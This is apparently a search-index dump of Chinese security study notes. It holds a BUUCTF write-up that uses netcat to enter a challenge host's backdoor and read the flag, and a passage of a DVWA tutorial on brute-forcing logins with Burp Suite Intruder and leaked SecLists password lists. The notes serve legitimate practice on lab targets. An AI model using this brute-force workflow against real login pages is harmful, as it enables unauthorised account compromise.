\u8bed\u4e49\u5206\u6790\u548c\u4e2d\u95f4\u4ee3\u7801\u751f\u6210"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#9","text":"","title":"9. \u7b26\u53f7\u8868"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#91","text":"","title":"9.1. \u7b26\u53f7\u8868\u7684\u57fa\u672c\u6982\u5ff5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#10","text":"","title":"10. \u4f18\u5316"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#101","text":"","title":"10.1. \u4f18\u5316\u7684\u539f\u5219\u548c\u4e3b\u8981\u65b9\u6cd5\u3001\u57fa\u672c\u5757\u5212\u5206"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/BUUCTF/1.BUUCTF_Pwn_test_your_nc/","text":"BUUCTF Pwn test your nc # \u76ee\u5f55 # [toc] 1. Description # Title : test_your_nc Lan Domain : 12399-0b7391f3-2f79-44d9-9f94-5f1349ed2d07 Target : node3.buuoj.cn:29023 Pwn \u7c7b\u9898\u76ee\u7684\u5165\u95e8\u9898\uff0c\u6211\u4eec\u9700\u8981\u83b7\u53d6\u76ee\u6807\u673a\u4e0a\u7684 flag \u5bc6\u94a5\u3002 2. Source # BUUCTF Pwn test your nc 3. \u9898\u89e3 # NetCat \u5728\u7f51\u7edc\u5de5\u5177\u4e2d\u6709\u201c\u745e\u58eb\u519b\u5200\u201d\u7f8e\u8a89\uff0c\u5e2e\u52a9\u6587\u6863\u5982\u4e0b\u3002 OpenBSD netcat (Debian patchlevel 1.187-1ubuntu0.1) usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [destination] [port] Command Summary: -4 Use IPv4 -6 Use IPv6 -b Allow broadcast -C Send CRLF as line-ending -D Enable the debug socket option -d Detach from stdin -F Pass socket fd -h This help text -I length TCP receive buffer length -i interval Delay interval for lines sent, ports scanned -k Keep inbound sockets open for multiple connects -l Listen mode, for inbound connects -M ttl Outgoing TTL / Hop Limit -m minttl Minimum incoming TTL / Hop Limit -N Shutdown the network socket after EOF on stdin -n Suppress name/port resolutions -O length TCP send buffer length -P proxyuser Username for proxy authentication -p port Specify local port for remote connects -q secs quit after EOF on stdin and delay of secs -r Randomize remote ports -S Enable the TCP MD5 signature option -s source Local source address -T keyword TOS value -t Answer TELNET negotiation -U Use UNIX domain socket -u UDP mode -V rtable Specify alternate routing table -v Verbose -W recvlimit Terminate after receiving a number of packets -w timeout Timeout for connects and final net reads -X proto Proxy protocol: \"4\", \"5\" (SOCKS) or \"connect\" -x addr[:port] Specify proxy address and port -Z DCCP mode -z Zero-I/O mode [used for scanning] Port numbers can be individual or ranges: lo-hi [inclusive] \u76ee\u6807\u673a\u5df2\u7ecf\u7559\u4e86\u540e\u95e8\uff0c\u76f4\u63a5\u4f7f\u7528 nc \u5efa\u7acb\u8fde\u63a5\u5373\u53ef\uff0c flag \u5c31\u5728\u5f53\u524d\u76ee\u5f55\u4e2d\u3002 > nc node3.buuoj.cn 25066 > ls bin boot dev etc flag home lib lib32 lib64 media mnt opt proc pwn root run sbin srv sys tmp usr var > cat flag flag{c774e600-83e3-4c92-a0a2-2a3558eccde0} > exit \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.BUUCTF Pwn test your nc"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/BUUCTF/1.BUUCTF_Pwn_test_your_nc/#buuctf-pwn-test-your-nc","text":"","title":"BUUCTF Pwn test your nc"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/BUUCTF/1.BUUCTF_Pwn_test_your_nc/#_1","text":"[toc]","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/BUUCTF/1.BUUCTF_Pwn_test_your_nc/#1-description","text":"Title : test_your_nc Lan Domain : 12399-0b7391f3-2f79-44d9-9f94-5f1349ed2d07 Target : node3.buuoj.cn:29023 Pwn \u7c7b\u9898\u76ee\u7684\u5165\u95e8\u9898\uff0c\u6211\u4eec\u9700\u8981\u83b7\u53d6\u76ee\u6807\u673a\u4e0a\u7684 flag \u5bc6\u94a5\u3002","title":"1. Description"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/BUUCTF/1.BUUCTF_Pwn_test_your_nc/#2-source","text":"BUUCTF Pwn test your nc","title":"2. Source"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/BUUCTF/1.BUUCTF_Pwn_test_your_nc/#3","text":"NetCat \u5728\u7f51\u7edc\u5de5\u5177\u4e2d\u6709\u201c\u745e\u58eb\u519b\u5200\u201d\u7f8e\u8a89\uff0c\u5e2e\u52a9\u6587\u6863\u5982\u4e0b\u3002 OpenBSD netcat (Debian patchlevel 1.187-1ubuntu0.1) usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [destination] [port] Command Summary: -4 Use IPv4 -6 Use IPv6 -b Allow broadcast -C Send CRLF as line-ending -D Enable the debug socket option -d Detach from stdin -F Pass socket fd -h This help text -I length TCP receive buffer length -i interval Delay interval for lines sent, ports scanned -k Keep inbound sockets open for multiple connects -l Listen mode, for inbound connects -M ttl Outgoing TTL / Hop Limit -m minttl Minimum incoming TTL / Hop Limit -N Shutdown the network socket after EOF on stdin -n Suppress name/port resolutions -O length TCP send buffer length -P proxyuser Username for proxy authentication -p port Specify local port for remote connects -q secs quit after EOF on stdin and delay of secs -r Randomize remote ports -S Enable the TCP MD5 signature option -s source Local source address -T keyword TOS value -t Answer TELNET negotiation -U Use UNIX domain socket -u UDP mode -V rtable Specify alternate routing table -v Verbose -W recvlimit Terminate after receiving a number of packets -w timeout Timeout for connects and final net reads -X proto Proxy protocol: \"4\", \"5\" (SOCKS) or \"connect\" -x addr[:port] Specify proxy address and port -Z DCCP mode -z Zero-I/O mode [used for scanning] Port numbers can be individual or ranges: lo-hi [inclusive] \u76ee\u6807\u673a\u5df2\u7ecf\u7559\u4e86\u540e\u95e8\uff0c\u76f4\u63a5\u4f7f\u7528 nc \u5efa\u7acb\u8fde\u63a5\u5373\u53ef\uff0c flag \u5c31\u5728\u5f53\u524d\u76ee\u5f55\u4e2d\u3002 > nc node3.buuoj.cn 25066 > ls bin boot dev etc flag home lib lib32 lib64 media mnt opt proc pwn root run sbin srv sys tmp usr var > cat flag flag{c774e600-83e3-4c92-a0a2-2a3558eccde0} > exit \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u9898\u89e3"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/","text":"DVWA Brute Force Low # \u76ee\u5f55 # DVWA Brute Force Low \u76ee\u5f55 1. \u80cc\u666f 2. \u51c6\u5907\u5de5\u4f5c 2.1. \u9776\u573a\u73af\u5883 2.2. \u5b89\u88c5\u7834\u89e3\u5de5\u5177 3. \u7834\u89e3\u8fc7\u7a0b 3.1. \u4ee3\u7406\u8bf7\u6c42 3.2. \u62e6\u622a\u8bf7\u6c42 3.3. \u586b\u88c5\u5f39\u836f 3.4. \u8bbe\u7f6e\u5c97\u54e8 3.5. \u5f00\u59cb\u653b\u51fb 4. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u6700\u8fd1\u53c2\u52a0\u4e86 2020\u817e\u8baf\u5b89\u5168\u5e73\u53f0\u90e8\u6781\u5ba2\u6280\u672f\u6311\u6218\u8d5b \uff0c\u83b7\u5f97\u4e86\u4e00\u6b21\u817e\u8baf\u7eff\u8272\u901a\u9053\u9762\u8bd5\u7684\u673a\u4f1a\uff0c\u56e0\u6b64\u6211\u60f3\u8981\u501f\u6b64\u673a\u4f1a\u8865\u5145\u4e00\u4e0b\u7f51\u7edc\u5b89\u5168\u65b9\u9762\u7684\u77e5\u8bc6\uff0c\u4e8e\u662f\u5c31\u4ece\u57fa\u7840\u7684\u9776\u573a DVWA (Damn Vulnerable Web Application) \u5f00\u59cb\u5237\u8d77\uff0c\u8fd9\u4e00\u7bc7\u662f\u5173\u4e8e\u66b4\u529b\u7834\u89e3\u5b89\u5168\u7b49\u7ea7\u4e3a Low \u7684\u8d26\u53f7\u5bc6\u7801\u7684\u5185\u5bb9\u3002 \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002 2. \u51c6\u5907\u5de5\u4f5c # 2.1. \u9776\u573a\u73af\u5883 # \u9996\u5148\u914d\u7f6e\u9776\u573a\u73af\u5883\uff0c\u5982\u679c\u60f3\u8981\u5728\u672c\u5730\u914d\u7f6e\u9776\u573a\u73af\u5883\uff0c\u53ef\u4ee5\u53c2\u8003 github\u4e0a\u7684\u6559\u7a0b \uff0c\u8fd9\u91cc\u63a8\u8350\u5927\u5bb6\u76f4\u63a5\u4f7f\u7528 vulnspy \u63d0\u4f9b\u7684 \u5728\u7ebf\u7684\u9776\u573a\u73af\u5883 \u3002 \u5982\u56fe1\u6240\u793a\uff0c\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684 Start To Hack \u4f7f\u7528GitHub\u8d26\u53f7\u767b\u9646\uff0c\u5373\u53ef\u521b\u5efa\u9776\u573a\u73af\u5883\u3002 \\text{Figure 1. \u521b\u5efa\u9776\u573a\u73af\u5883} \u521b\u5efa\u73af\u5883\u4ee5\u540e\uff0c\u5728 LABS \u6807\u7b7e\u4e0b\uff0c\u70b9\u51fb Target Address \u4e0b\u7684\u94fe\u63a5\u5373\u53ef\u8fdb\u5165\u73af\u5883\uff0c\u4e00\u6b21\u521b\u5efa\u6709\u6548\u671f\u4e3a 2 \u4e2a\u5c0f\u65f6\uff0c\u7ed3\u675f\u540e\u53ef\u4ee5\u518d\u6b21\u521b\u5efa\uff0c\u6700\u591a\u80fd\u591f\u540c\u65f6\u521b\u5efa 5 \u4e2a\u5b9e\u9a8c\u73af\u5883\u3002 \\text{Figure 2. \u8fdb\u5165\u9776\u573a\u73af\u5883} \u8fdb\u5165\u9875\u9762\u4ee5\u540e\uff0c\u8d26\u53f7\u5bc6\u7801\u90fd\u662f\u9ed8\u8ba4\u7684\uff0c\u70b9\u51fb\u767b\u9646\u3002 \\text{Figure 3. \u767b\u9646} \u62c9\u5230\u9875\u9762\u5e95\u90e8\uff0c\u70b9\u51fb\u521b\u5efa\u6570\u636e\u5e93\u3002 \\text{Figure 4. \u521b\u5efa\u6570\u636e\u5e93} \u521b\u5efa\u5b8c\u6210\u540e\uff0c\u4f1a\u56de\u5230\u767b\u9646\u9875\u9762\u8981\u6c42\u91cd\u65b0\u767b\u9646\uff0c\u518d\u6b21\u767b\u9646\u5373\u53ef\u3002 \u9ed8\u8ba4\u7684\u96be\u5ea6\u662f impossible \uff0c\u57fa\u672c\u6ca1\u6709\u5b89\u5168\u6f0f\u6d1e\uff0c\u6211\u4eec\u8981\u70b9\u51fb\u5de6\u8fb9\u7684 DVWA Security \u8bbe\u7f6e\u96be\u5ea6\u3002 \\text{Figure 5. \u8fdb\u5165\u8bbe\u7f6e\u96be\u5ea6\u9875\u9762} \u9875\u9762\u4e0a\u4e5f\u6709\u76f8\u5e94\u7684\u96be\u5ea6\u8bf4\u660e\uff0c\u6211\u4eec\u5148\u4ece Low \u7684\u96be\u5ea6\u5f00\u59cb\u8bad\u7ec3\u3002 \\text{Figure 6. \u8bbe\u7f6e\u96be\u5ea6\u4e3aLow} \u70b9\u51fb\u5de6\u8fb9\u7684 Brute Force \u6807\u7b7e\uff0c\u6211\u4eec\u5c31\u8fdb\u5165\u5230\u5bc6\u7801\u7834\u89e3\u7684\u8bad\u7ec3\u9875\u9762\u4e86\u3002 \\text{Figure 7. Brute Force} 2.2. \u5b89\u88c5\u7834\u89e3\u5de5\u5177 # \u4e0b\u8f7d Burp Suite Community \u514d\u8d39\u7248\u672c \uff0c\u56fe\u5f62\u754c\u9762\u5b89\u88c5\u3002\u4e0b\u8f7d\u6709\u70b9\u6162\uff0c Mac \u7cfb\u7edf\u7684\u540c\u5b66\u53ef\u4ee5\u4ece\u767e\u5ea6\u7f51\u76d8\u4e0b\u8f7d\u3002 \u94fe\u63a5: https://pan.baidu.com/s/1fXM7uKv2lE5KoEDgCVnazQ \u5bc6\u7801:x7sj \u5b89\u88c5\u5b8c\u6210\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u6211\u4eec\u7684\u7834\u89e3\u4e86\u3002 3. \u7834\u89e3\u8fc7\u7a0b # 3.1. \u4ee3\u7406\u8bf7\u6c42 # \u9996\u5148\u8bbe\u7f6e\u6d4f\u89c8\u5668\u7684\u4ee3\u7406\uff0c\u5728 Safari \u4e2d\u64cd\u4f5c\u8def\u5f84\u4e3a\u4e3a \u504f\u597d\u8bbe\u7f6e - \u9ad8\u7ea7 - \u4ee3\u7406 - \u66f4\u6539\u8bbe\u7f6e \uff0c\u8bbe\u7f6eHTTP\u4ee3\u7406\uff0c\u5c06\u4ee3\u7406\u670d\u52a1\u5668\u5730\u5740\u8bbe\u7f6e\u4e3a 127.0.0.1:8000 \u3002 \\text{Figure 8. \u4ee3\u7406} \u4e0e Proxy - Option \u4e2d\u7684\u8bbe\u7f6e\u4fdd\u6301\u4e00\u81f4\u3002 \\text{Figure 9. Proxy - Option} \u6211\u4eec\u518d\u5bf9 Burp Proxy \u8fdb\u884c\u4e00\u4e9b\u4e86\u89e3\u3002\u5185\u5bb9\u53c2\u8003\u81ea \u300aWeb\u5b89\u5168\u653b\u9632\uff1a\u6e17\u900f\u6d4b\u8bd5\u5b9e\u6218\u6307\u5357\u300b \u4e2d\u5bf9 Burp Proxy \u7684\u4ecb\u7ecd\u3002 Burp Proxy \u662f\u5229\u7528 Burp \u5f00\u5c55\u6d4b\u8bd5\u6d41\u7a0b\u7684\u6838\u5fc3\uff0c\u901a\u8fc7\u4ee3\u7406\u6a21\u5f0f\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u62e6\u622a\u3001\u67e5\u770b\u3001\u4fee\u6539\u6240\u6709\u5728\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u4e4b\u95f4\u4f20\u8f93\u7684\u6570\u636e\u3002 Burp Proxy \u7684\u62e6\u622a\u529f\u80fd\u4e3b\u8981\u7531 Intercept \u9009\u9879\u5361\u4e2d\u7684 Forward\u3001Drop\u3001Interception is on/off\u548cAction \u6784\u6210\uff0c\u5b83\u4eec\u7684\u529f\u80fd\u5982\u4e0b\u6240\u793a\u3002 Forward \u8868\u793a\u5c06\u62e6\u622a\u7684\u6570\u636e\u5305\u6216\u4fee\u6539\u540e\u7684\u6570\u636e\u5305\u53d1\u9001\u81f3\u670d\u52a1\u5668\u7aef\u3002 Drop \u8868\u793a\u4e22\u5f03\u5f53\u524d\u62e6\u622a\u7684\u6570\u636e\u5305\u3002 Interception is on \u8868\u793a\u5f00\u542f\u62e6\u622a\u529f\u80fd\uff0c\u5355\u51fb\u540e\u53d8\u4e3a Interception is off \uff0c\u8868\u793a\u5173\u95ed\u62e6\u622a\u529f\u80fd\u3002 \u5355\u51fb Action \u6309\u94ae\uff0c\u53ef\u4ee5\u5c06\u6570\u636e\u5305\u8fdb\u4e00\u6b65\u53d1\u9001\u5230 Spider\u3001Scanner\u3001Repeater\u3001Intruder \u7b49\u529f\u80fd\u7ec4\u4ef6\u505a\u8fdb\u4e00\u6b65\u7684\u6d4b\u8bd5\uff0c\u540c\u65f6\u4e5f\u5305\u542b\u6539\u53d8\u6570\u636e\u5305\u8bf7\u6c42\u65b9\u5f0f\u53ca\u5176body\u7684\u7f16\u7801\u7b49\u529f\u80fd\u3002 \u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u8f93\u5165\u9700\u8981\u8bbf\u95ee\u7684 URL \u5e76\u6309\u56de\u8f66\u952e\uff0c\u8fd9\u65f6\u5c06\u770b\u5230\u6570\u636e\u6d41\u91cf\u7ecf\u8fc7 Burp Proxy \u5e76\u6682\u505c\uff0c\u76f4\u5230\u5355\u51fb Forward \u6309\u94ae\uff0c\u624d\u4f1a\u7ee7\u7eed\u4f20\u8f93\u4e0b\u53bb\u3002\u5982\u679c\u5355\u51fb\u4e86 Drop \u6309\u94ae\uff0c\u8fd9\u6b21\u901a\u8fc7\u7684\u6570\u636e\u5c06\u4e22\u5931\uff0c\u4e0d\u518d\u7ee7\u7eed\u5904\u7406\u3002 \u5f53 Burp Suite \u62e6\u622a\u7684\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4ea4\u4e92\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 Burp Suite \u7684\u6d88\u606f\u5206\u6790\u9009\u9879\u4e2d\u67e5\u770b\u8fd9\u6b21\u8bf7\u6c42\u7684\u5b9e\u4f53\u5185\u5bb9\u3001\u6d88\u606f\u5934\u3001\u8bf7\u6c42\u53c2\u6570\u7b49\u4fe1\u606f\u3002 Burp \u6709\u56db\u79cd\u6d88\u606f\u7c7b\u578b\u663e\u793a\u6570\u636e\u5305\uff1a Raw\u3001Params\u3001Headers \u548c Hex \u3002 Raw \u4e3b\u8981\u663e\u793a Web \u8bf7\u6c42\u7684 raw \u683c\u5f0f\uff0c\u4ee5\u7eaf\u6587\u672c\u7684\u5f62\u5f0f\u663e\u793a\u6570\u636e\u5305\uff0c\u5305\u542b\u8bf7\u6c42\u5730\u5740\u3001 HTTP \u534f\u8bae\u7248\u672c\u3001\u4e3b\u673a\u5934\u3001\u6d4f\u89c8\u5668\u4fe1\u606f\u3001 Accept \u53ef\u63a5\u53d7\u7684\u5185\u5bb9\u7c7b\u578b\u3001\u5b57\u7b26\u96c6\u3001\u7f16\u7801\u65b9\u5f0f\u3001 cookie \u7b49\uff0c\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u4fee\u6539\u8fd9\u4e9b\u4fe1\u606f\uff0c\u5bf9\u670d\u52a1\u5668\u7aef\u8fdb\u884c\u6e17\u900f\u6d4b\u8bd5\u3002 Params \u4e3b\u8981\u663e\u793a\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u53c2\u6570\u4fe1\u606f\uff0c\u5305\u62ecGET\u6216\u8005POST\u8bf7\u6c42\u7684\u53c2\u6570\u3001 cookie \u53c2\u6570\u3002\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8fd9\u4e9b\u8bf7\u6c42\u53c2\u6570\u5b8c\u6210\u5bf9\u670d\u52a1\u5668\u7aef\u7684\u6e17\u900f\u6d4b\u8bd5\u3002 Headers \u4e2d\u663e\u793a\u7684\u662f\u6570\u636e\u5305\u4e2d\u7684\u5934\u4fe1\u606f\uff0c\u4ee5\u540d\u79f0\u3001\u503c\u7684\u5f62\u5f0f\u663e\u793a\u6570\u636e\u5305\u3002 Hex \u5bf9\u5e94\u7684\u662fRaw\u4e2d\u4fe1\u606f\u7684\u4e8c\u8fdb\u5236\u5185\u5bb9\uff0c\u53ef\u4ee5\u901a\u8fc7Hex\u7f16\u8f91\u5668\u5bf9\u8bf7\u6c42\u7684\u5185\u5bb9\u8fdb\u884c\u4fee\u6539\uff0c\u5728\u8fdb\u884c00\u622a\u65ad\u65f6\u975e\u5e38\u597d\u7528\u3002 1 3.2. \u62e6\u622a\u8bf7\u6c42 # \u63a5\u4e0b\u6765\u6211\u4eec\u8981\u5f00\u59cb\u62e6\u622a\u8bf7\u6c42\uff0c\u5728 Burp Suite \u70b9\u51fb Intercept is off \u4e2d\u6253\u5f00\u8bf7\u6c42\u62e6\u622a\u3002 \\text{Figure 10. \u8bf7\u6c42\u62e6\u622a} \u5728\u9776\u573a\u7684 Brute Force \u9875\u9762\u4e2d\u8f93\u5165\u4efb\u610f\u7684\u8d26\u53f7\u5bc6\u7801\uff0c\u70b9\u51fb\u767b\u9646\u3002\u5728 Burp Suite \u7684 Proxy - Intecept \u754c\u9762\u4e2d\u663e\u793a\u62e6\u622a\u6210\u529f\uff0c\u70b9\u51fb Intercept is on \u5173\u95ed\u62e6\u622a\u3002 \\text{Figure 11. \u62e6\u622a\u6210\u529f} \u5728Http History\u4e2d\u627e\u5230\u5e26\u8d26\u53f7\u5bc6\u7801\u7684\u8bf7\u6c42\u3002 \\text{Figure 12. Http History} \u5168\u9009\u540e\uff0c\u53f3\u952e\u9009\u62e9 Send To Intruder \u3002 \\text{Figure 13. Send To Intruder} \u5728 Intruder - 2 - Position \u754c\u9762\u4e2d\uff0c\u5c06\u7528\u6237\u540d\u548c\u5bc6\u7801\u4ee5\u5916\u7684\u53d8\u91cf\u53bb\u9664\uff0c\u9009\u62e9 Attack type \u4e3a Pitchfork \u3002 \\text{Figure 14. Intruder} \u5404\u79cd\u6a21\u5f0f\u7684\u533a\u522b\u53ef\u4ee5\u53c2\u8003 \u300aWeb\u5b89\u5168\u653b\u9632\uff1a\u6e17\u900f\u6d4b\u8bd5\u5b9e\u6218\u6307\u5357\u300b \u4e2d\u7684\u5185\u5bb9\uff0c\u5177\u4f53\u5982\u4e0b\u3002 Sniper \u6a21\u5f0f\u4f7f\u7528 \u5355\u4e00 \u7684 Payload \u7ec4\u3002\u5b83\u4f1a\u9488\u5bf9\u6bcf\u4e2a\u4f4d\u7f6e\u8bbe\u7f6e Payload \u3002\u8fd9\u79cd\u653b\u51fb\u7c7b\u578b\u9002\u7528\u4e8e\u5bf9\u5e38\u89c1\u6f0f\u6d1e\u4e2d\u7684\u8bf7\u6c42\u53c2\u6570\u5355\u72ec\u8fdb\u884c Fuzzing \u6d4b\u8bd5\u7684\u60c5\u666f\u3002\u653b\u51fb\u4e2d\u7684\u8bf7\u6c42\u603b\u6570\u5e94\u8be5\u662f position \u6570\u91cf\u548c Payload \u6570\u91cf\u7684\u4e58\u79ef\u3002 Battering ram \u6a21\u5f0f\u4f7f\u7528 \u5355\u4e00 \u7684 Payload \u7ec4\u3002\u5b83\u4f1a\u91cd\u590d Payload \u5e76\u4e00\u6b21\u6027\u628a\u6240\u6709\u76f8\u540c\u7684 Payload \u653e\u5165\u6307\u5b9a\u7684\u4f4d\u7f6e\u4e2d\u3002\u8fd9\u79cd\u653b\u51fb\u9002\u7528\u4e8e\u9700\u8981\u5728\u8bf7\u6c42\u4e2d\u628a\u76f8\u540c\u7684\u8f93\u5165\u653e\u5230\u591a\u4e2a\u4f4d\u7f6e\u7684\u60c5\u666f\u3002\u8bf7\u6c42\u7684\u603b\u6570\u662f Payload \u7ec4\u4e2d Payload \u7684\u603b\u6570\u3002 Pitchfork \u6a21\u5f0f\u4f7f\u7528 \u591a\u4e2a Payload \u7ec4\u3002\u653b\u51fb\u4f1a\u540c\u6b65\u8fed\u4ee3\u6240\u6709\u7684 Payload \u7ec4\uff0c\u628a Payload \u653e\u5165\u6bcf\u4e2a\u5b9a\u4e49\u7684\u4f4d\u7f6e\u4e2d\u3002\u8fd9\u79cd\u653b\u51fb\u7c7b\u578b\u975e\u5e38\u9002\u5408\u5728\u4e0d\u540c\u4f4d\u7f6e\u4e2d\u9700\u8981\u63d2\u5165\u4e0d\u540c\u4f46\u76f8\u4f3c\u8f93\u5165\u7684\u60c5\u51b5\u3002\u8bf7\u6c42\u7684\u6570\u91cf\u5e94\u8be5\u662f\u6700\u5c0f\u7684 Payload \u7ec4\u4e2d\u7684 Payload \u6570\u91cf\u3002 Cluster bomb \u6a21\u5f0f\u4f1a\u4f7f\u7528 \u591a\u4e2a Payload \u7ec4\u3002\u6bcf\u4e2a\u5b9a\u4e49\u7684\u4f4d\u7f6e\u4e2d\u6709\u4e0d\u540c\u7684 Payload \u7ec4\u3002\u653b\u51fb\u4f1a\u8fed\u4ee3\u6bcf\u4e2a Payload \u7ec4\uff0c\u6bcf\u79cd Payload \u7ec4\u5408\u90fd\u4f1a\u88ab\u6d4b\u8bd5\u4e00\u904d\u3002\u8fd9\u79cd\u653b\u51fb\u9002\u7528\u4e8e\u5728\u4f4d\u7f6e\u4e2d\u9700\u8981\u4e0d\u540c\u4e14\u4e0d\u76f8\u5173\u6216\u8005\u672a\u77e5\u8f93\u5165\u653b\u51fb\u7684\u60c5\u666f\u3002\u653b\u51fb\u8bf7\u6c42\u7684\u603b\u6570\u662f\u5404 Payload \u7ec4\u4e2d Payload \u6570\u91cf\u7684\u4e58\u79ef\u3002 1 3.3. \u586b\u88c5\u5f39\u836f # \u8981\u901a\u8fc7\u66b4\u529b\u6765\u7834\u89e3\u5bc6\u7801\uff0c\u904d\u5386\u6240\u6709\u7b26\u53f7\u7684\u6392\u5217\u7ec4\u5408\u662f\u6bd4\u8f83\u4f4e\u6548\u7684\uff0c\u56e0\u4e3a\u6bcf\u79cd\u60c5\u51b5\u5e76\u975e\u7b49\u53ef\u80fd\u5730\u51fa\u73b0\uff0c\u4eba\u4eec\u4e3a\u4e86\u8981\u8bb0\u5fc6\u81ea\u5df1\u7684\u5bc6\u7801\uff0c\u4e00\u822c\u90fd\u4f1a\u9075\u5faa\u67d0\u4e9b\u89c4\u5f8b\uff0c\u6bd4\u5982\u5728\u5bc6\u7801\u4e2d\u5305\u542b\u59d3\u540d\u3001\u751f\u65e5\u7b49\u7b49\u5b57\u6bb5\u3002\u6240\u4ee5\u6211\u4eec\u5c31\u9700\u8981\u4e00\u4efd\u5305\u542b\u9ad8\u9891\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u8bcd\u5178\u4f5c\u4e3a\u5f39\u836f\uff0c\u4ece\u800c\u5bf9\u7cfb\u7edf\u8fdb\u884c\u8f70\u70b8\u3002 \u6211\u9009\u62e9\u7684\u662f Github\u4e0a\u7684SecLists\u9879\u76ee \uff0c\u4e0a\u9762\u6709\u8bb8\u591a\u5728\u6697\u7f51\u6216\u8005\u5176\u4ed6\u6e20\u9053\u6cc4\u9732\u51fa\u6765\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u6709\u4e9b\u6309\u7167\u9891\u7387\u8fdb\u884c\u4e86\u6392\u5e8f\uff0c\u66f4\u52a0\u65b9\u4fbf\u6211\u4eec\u4f7f\u7528\u3002 \u6211\u4e5f\u9009\u4e86\u4e00\u4e9b\u653e\u5728\u4e86\u767e\u5ea6\u7f51\u76d8\u4e0a\u3002 